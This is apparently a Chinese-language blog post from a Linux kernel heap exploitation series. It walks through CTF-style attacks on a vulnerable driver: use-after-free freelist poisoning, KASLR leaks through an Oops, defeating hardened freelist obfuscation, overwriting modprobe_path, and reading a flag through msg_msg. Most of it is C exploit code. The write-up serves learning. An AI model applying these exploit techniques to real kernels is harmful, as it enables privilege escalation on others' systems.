---
layout: post
tags: [kernel_pwn]
title: "kernel heap 3: 内核堆利用技巧 2"
author: wsxk
date: 2026-7-25
comments: true
---


- [5.3  kaslr + randomized freelist](#53--kaslr--randomized-freelist)
- [5.4 kaslr + randomized freelist + HARDENED freelist](#54-kaslr--randomized-freelist--hardened-freelist)
- [5.5 kaslr + randomized freelist + HARDENED freelist + 不具备读能力](#55-kaslr--randomized-freelist--hardened-freelist--不具备读能力)
- [5.6](#56)
- [5.7](#57)


PS： 章节承接[https://wsxk.github.io/kernel_heap2/](https://wsxk.github.io/kernel_heap2/)<br>

## 5.3  kaslr + randomized freelist<br>
攻击条件: 可以任意读写某个 kernel slab的内容。可以多次分配/释放内存<br> 
漏洞：某个kernel slab的 `uaf` `double free`<br>
泄露地址:<br>
```
1、 通过kernel crash获取kernel基址信息。
因为有uaf，其实相当于我们可以随便改slab freelist的next_ptr地址。
2、uaf修改next_ptr为非法地址
3、申请到该非法地址，触发oops
```
oops脚本:<br>
```c
    //get kernel_base_addr: via Oops
    int fd = open_device();
    char buf[1048];
    // step 1: free the chunk -> freelist
    printf("step1\n");
    free_slot(fd,buf,0);
    // step 2: set next_ptr = 0x4141414141414141
    printf("step2\n");
    memset(buf,0x41,0x1d0);
    write_slot(fd,buf,0x1d0);
    // step 3: alloc the buf
    printf("step3\n");
    int fd2 = open_device(); // fd2.buf = fd.buf
    // step 4: trigger oops
    printf("step4\n");
    int fd3 = open_device();
```
第二步，根据泄露的地址进行漏洞利用，利用方法为修改slab中的`next_ptr`指向`modprobe_path`，并修改`modprobe_path`的内容。<br>
```c
    environ_set();
    //step 0: get kernel_base_addr: via Oops
    unsigned long long kernel_base_addr = 0;
    scanf("%llx",&kernel_base_addr);
    kernel_base_addr = kernel_base_addr - 0x58c20;
    printf("kernel_addr: %llx\n",kernel_base_addr);
    unsigned long long modprobe_addr = kernel_base_addr+0x13f4c0-0x100;
    printf("modprobe_path addr: %llx\n",modprobe_addr);

    //get kernel_base_addr: via Oops
    int fd = open_device();
    char buf[1048];
    // step 1: free the chunk -> freelist
    printf("step1\n");
    free_slot(fd,buf,0);
    // step 2: set next_ptr -> modprobe addr
    printf("step2\n");
    for(int i=0;i<=29;i++){
        memcpy(buf+8*i,(char *)&modprobe_addr,8);
    }
    write_slot(fd,buf,0x8*30);
    // step 3: alloc the buf
    printf("step3\n");
    int fd2 = open_device(); // fd2.buf = fd.buf
    // step 4: write modprobe_path
    printf("step4\n");
    int fd3 = open_device();
    memset(buf,0,0x100);
    memcpy(buf+0x100,"/tmp/exp\x00",10);
    write_slot(fd3,buf,0x100+10);

    get_flag();
```
这里有一个坑点，需要注意`modprobe_path`+0x100的位置为`kmod_concurrent_max`,这个结构体不能随意修改。<br>

## 5.4 kaslr + randomized freelist + HARDENED freelist<br>
攻击条件: 可以任意读写某个 kernel slab的内容。可以多次分配/释放内存<br> 
漏洞：某个kernel slab的 `uaf` `double free`<br>
泄露地址:<br>
加了`HARDENED freelist`机制后，之前篡改`next_ptr`会导致kernel panic。暂且不知道理由为何<br>
```
1、 通过kernel crash获取kernel基址信息。（这里需要先获取 s->random ^ swab(ptr_addr) ）的值，可以通过分配完一个slab中的所有slot，再释放slot a，这样a实际下一个堆块为null，所以a->free_list = s->random ^ swab(ptr_addr)
因为有uaf，其实相当于我们可以随便改slab freelist的next_ptr地址。
2、uaf修改next_ptr为非法地址
3、申请到该非法地址，触发oops
```
第二步，根据泄露的地址进行漏洞利用，利用方法为修改slab中的`next_ptr`指向`modprobe_path`，并修改`modprobe_path`的内容。<br>
这里因为思想的进步，想到了一个可以一个脚本完成所有任务的办法:<br>
主要利用的思想是：**内核文件交互可以是并发的，内核文件的kheap服务于所有用户；父子进程共享文件描述符的话，即使其中一个进程销毁了，其相应的文件句柄也不会被释放**<br>
```c
int victim_fd; 
int main(){
    int fd[8];
    for(int i=0;i<8;i++){   //父子进程共享，这样其中一个进程消失也不会被释放
        fd[i] = open_device();
    }
    char buf[1048];
    // step 1: free the chunk -> freelist
    printf("step1\n");
    free_slot(fd[0],buf,0);
    // step 2: leak the swab(&ptr) ^ random
    printf("step2\n");
    memset(buf,0,1048);
    read_slot(fd[0],buf,0x1d0);
    printf("key: %llx\n",*(unsigned long long *)(buf+0xe8));

    // step 3: change next_ptr -> 0x4141414141414141
    printf("step3\n");
    unsigned long long key = *(unsigned long long *)(buf+0xe8);
    key = key ^ 0x4141414141414141;
    *(unsigned long long *)(buf+0xe8) = key;
    write_slot(fd[0],buf,0x1d0); // 此时kmem_cache的free_list中，存在 A-> 0XAAAAAAAA 的链表

    // step 4: alloc slot
    printf("step4\n");
    victim_fd = open_device();  //此时kmem_cache的free_list中，存在0XAAAAAAAA 的链表
    int pid = fork();
    if (pid == 0){
        int fd3 = open_device(); // saved in cache freelist ，此时分配失败，因为0xAAAAAAAA是无效地址，分配失败后， 链表中仍然是 0xAAAAAAAA
    }else{
        int status;
        waitpid(pid, &status, 0); //等待子进程结束，因为父子进程共享文件描述符，所以子进程销毁后他们也不会被释放，当前 kmem_cache的链表仍然为 0xAAAAAAAA
        environ_set();
        //step 0: get kernel_base_addr: via Oops
        unsigned long long kernel_base_addr = 0;
        scanf("%llx",&kernel_base_addr);
        kernel_base_addr = kernel_base_addr - 0x58c20;
        printf("kernel_addr: %llx\n",kernel_base_addr);
        unsigned long long modprobe_addr = kernel_base_addr+0x13f4c0-0x100;
        printf("modprobe_path addr: %llx\n",modprobe_addr);
        //get kernel_base_addr: via Oops
        // step 0 : construct `next_ptr = null situation`

        char buf[1048];
        // step 1: free the chunk -> freelist
        printf("step1\n");
        free_slot(victim_fd,buf,0);
        // step 2: leak the swab(&ptr) ^ random
        printf("step2\n");
        memset(buf,0,1048);
        read_slot(victim_fd,buf,0x1d0);
        printf("key: %llx\n",*(unsigned long long *)(buf+0xe8));
    
        // step 3: change next_ptr -> modprobe
        printf("step3\n");
        unsigned long long key = *(unsigned long long *)(buf+0xe8);
        key = key ^ modprobe_addr ^0x4141414141414141;
        *(unsigned long long *)(buf+0xe8) = key;
        write_slot(victim_fd,buf,0x1d0);
        // step 4: alloc slot
        printf("step4\n");
        int fd2 = open_device();
        int fd3 = open_device();
        memset(buf,0,0x100);
        memcpy(buf+0x100,"/tmp/exp\x00",10);
        write_slot(fd3,buf,0x100+10);
    
        get_flag();
    }

```


## 5.5 kaslr + randomized freelist + HARDENED freelist + 不具备读能力<br>
攻击条件: 可以任意写一个 kernel slot（并非ko自己调用`kmem_cache_alloc`申请的`kmem_cache`，而是**`kmalloc_trace(kmalloc_caches[51], 4197568, 464);`申请**）的内容。可以多次分配/释放内存<br> 
漏洞：某个kernel slot的 `uaf` `double free`<br>
这里的目标不是提权，而是获取flag，flag会放入由另一个`kmalloc_trace(kmalloc_caches[51], 4197568, 464);`申请的slot中，不可读。<br>
这里的目标是设法获取kernel中该slot的内容。<br>
这就要提到[kernel heap 利用技巧: msg_msg和pipe_buffer](https://wsxk.github.io/kernel_heap_tech/)里的`msg`结构体了。<br>
```c
int main(){
    char buf[1048];

    pin_to_current_cpu();
    // step 1: open_device
    int fd = open_device(); 

    // step 2: free the slot A
    free_slot(fd,buf,0x1d0); 
    
    // step 3: make the msg use the freed slot
    int msg_id = msg_create_queue();
    struct message ingoing;
    memset(ingoing.text,0x61,MESSAGE_SIZE);
    ingoing.type = 1; // >= 0 is necessary
    msg_send(msg_id,&ingoing,MESSAGE_SIZE,0);  // now msg structure is  msg_msg -> A

    // step 4: free the msg_seg again
    free_slot(fd,buf,0x1d0);  // A is freed

    // step 5: get flag to the msg_seg
    copy_flag(fd,buf,0x1d0); // A is allocated , and contents have been changed

    // step 6: set the A->next_ptr to 0
    memset(buf,0,1048);
    write_slot(fd,buf,8);

    // step 7: recv the msg
    struct message outgoing;
    msg_recv(msg_id,&outgoing,MESSAGE_SIZE,0,0); // now mag_msg and A are freed

    // step 8: resume the env
    copy_flag(fd,buf,0x1d0); // in order to avoid kernel panic(caused by freeing  freed_slot)

    memcpy(buf,outgoing.text+DATAMSG_LEN,DATAMSGSEG_LEN);
    printf("%s\n",buf);
}
```




## 5.6<br>

## 5.7<br>








<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>